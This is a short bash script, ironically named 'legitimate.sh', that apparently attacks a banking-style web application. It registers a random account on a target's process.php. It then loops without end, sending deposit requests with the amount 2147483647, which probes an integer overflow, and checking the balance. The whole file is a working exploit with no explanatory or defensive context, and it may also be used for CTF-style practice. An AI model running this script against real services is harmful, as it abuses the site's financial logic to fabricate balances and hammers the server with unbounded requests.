#!/bin/bash

if [ "$#" -ne 1 ];then
    echo "Usage: ./legitimate.sh <target>";
    exit 0
fi

USER=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)
PASS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)

curl -s -w 'Lookup time:\t%{time_total}'\\n -o /dev/null "$1/process.php?user=$USER&pass=$PASS&drop=register" &
sleep 1

while :
do
    curl -s -w 'Lookup time:\t%{time_total}'\\n -o /dev/null "$1/process.php?user=$USER&pass=$PASS&amount=2147483647&drop=deposit" &
    sleep 1
    curl -s -w 'Lookup time:\t%{time_total}'\\n -o /dev/null "$1/process.php?user=$USER&pass=$PASS&&drop=balance" &
    sleep 1
done